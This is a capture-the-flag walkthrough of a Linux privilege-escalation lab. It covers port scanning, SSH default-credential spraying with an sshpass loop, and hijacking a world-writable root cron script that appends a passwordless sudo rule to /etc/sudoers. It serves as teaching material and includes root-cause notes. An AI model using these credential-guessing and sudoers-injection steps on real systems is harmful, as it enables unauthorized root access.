# CTF Walkthrough: Cronman

**Category:** Linux Privilege Escalation (Cron Job Hijacking)
**Difficulty:** Easy–Medium
**Target:** `172.31.14.254` (initially `172.31.3.106`, reset mid-lab)

## Challenge Description

> Analyze system cron jobs and hijack automated tasks to gain admin control.
> Scheduled tasks execute in the background with elevated privileges. Somewhere
> within these automated processes lies a weakness waiting to be discovered.

---

## Step 1 — Initial Recon

Scanned open ports on the target:

```bash
nmap -sV -p- 172.31.14.254
```

**Result:** Only two ports open —
- `22/tcp` — OpenSSH 8.4p1 (Debian 11 / bullseye)
- `80/tcp` — nginx 1.18.0 serving a static Bootstrap template ("Moderna")

## Step 2 — Web Enumeration (Dead End)

Ran directory/file brute-forcing and manual checks against the web server:

```bash
gobuster dir -u http://172.31.14.254/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip -t 50
gobuster dir -u http://172.31.14.254/forms/ -w /usr/share/wordlists/dirb/common.txt -x php -t 50
nikto -h http://172.31.14.254
```

**Findings:**
- Only static HTML pages (`index.html`, `about.html`, `team.html`, etc.)
- `forms/contact.php` existed but was served as `application/octet-stream`
  (source code disclosure only — PHP wasn't actually executed by nginx)
- POST requests returned `405 Not Allowed` — confirmed no live backend
- HTML comments, image EXIF metadata, and page content contained no
  useful hints (all Lorem Ipsum filler + generic template data)

**Conclusion:** The website was a static decoy with no exploitable
vulnerability. This entire avenue was a dead end for gaining a foothold.

## Step 3 — Credential Discovery

After exhausting OSINT (team member names, `cewl`-generated wordlists,
themed guesses), a manual sweep of common/default lab credentials found
a working login:

```bash
for cred in "user:user" "student:student" "ctf:ctf" "vagrant:vagrant" ...; do
  sshpass -p "<pass>" ssh -o StrictHostKeyChecking=no <user>@172.31.14.254 'echo SUCCESS'
done
```

**Working credentials:** `user : user`

> ⚠️ Lesson learned: don't over-index on OSINT-derived wordlists for
> lab/CTF environments — many use simple, memorable default credentials
> rather than puzzle-based hints.

## Step 4 — SSH Access & System Recon

```bash
ssh user@172.31.14.254
whoami        # user
id            # uid=1003(user) gid=1004(user) groups=1004(user)
cat /etc/os-release   # Debian GNU/Linux 11 (bullseye)
```

## Step 5 — Cron Enumeration

```bash
cat /etc/crontab
```

Found the key entry:

```
*/2 *   * * *   root    /opt/scripts/backup.sh
```

A script run **every 2 minutes as root** via `/etc/crontab`.

## Step 6 — Identify the Weakness

```bash
ls -la /opt/scripts/backup.sh
cat /opt/scripts/backup.sh
```

**Result:**

```
-rwxrw-rw- 1 root root 69 May 13 11:52 /opt/scripts/backup.sh
```

The script was **world-writable** (`rw-rw-rw-`), meaning any local user
could modify a file that root executes automatically. Its contents:

```bash
#!/usr/bin/bash
echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

This appends a passwordless sudo rule for `user` to `/etc/sudoers`
every time the cron job fires.

## Step 7 — Privilege Escalation

Since the script had already been running for a while, sudo rights
were already granted:

```bash
sudo -l
# (ALL) NOPASSWD: ALL   — confirmed
```

Escalated directly to root:

```bash
sudo su
whoami   # root
id       # uid=0(root)
```

## Step 8 — Capture the Flag

```bash
find / -iname "*flag*" 2>/dev/null
cat /root/flag.txt
```

**Flag:**
```
ctf{Teed2aic2aiGoikiej7ayahn0aimoh3m}
```

---

## Root Cause Summary

| Weakness | Detail |
|---|---|
| **World-writable cron script** | `/opt/scripts/backup.sh` had `rw-rw-rw-` permissions |
| **Executed as root** | Cron ran it every 2 minutes via `/etc/crontab` with `root` privileges |
| **No integrity checks** | Nothing validated the script's contents or ownership before execution |

## Key Takeaways / Methodology Notes

1. **Always check permissions on every file a cron job touches** —
   not just the crontab entries, but the actual scripts and their
   parent directories.
2. `ls -la` on cron-referenced scripts is the single most important
   step once a privileged job is identified.
3. World-writable files executed by root are a critical
   misconfiguration — any local user can inject arbitrary commands.
4. Don't assume web recon is the intended path for every challenge —
   validate assumptions early and pivot when a vector produces no signal.
5. Try simple/default credentials before investing heavily in
   OSINT-based wordlist generation for lab environments.

## Tools Used

- `nmap` — port/service scanning
- `gobuster` — directory/file brute-forcing
- `nikto` — web vulnerability scanning
- `cewl` — custom wordlist generation from site content
- `hydra` / `sshpass` — SSH credential testing
- `exiftool` — image metadata inspection
- Standard Linux enumeration commands (`crontab`, `ls`, `cat`, `sudo -l`, `find`)
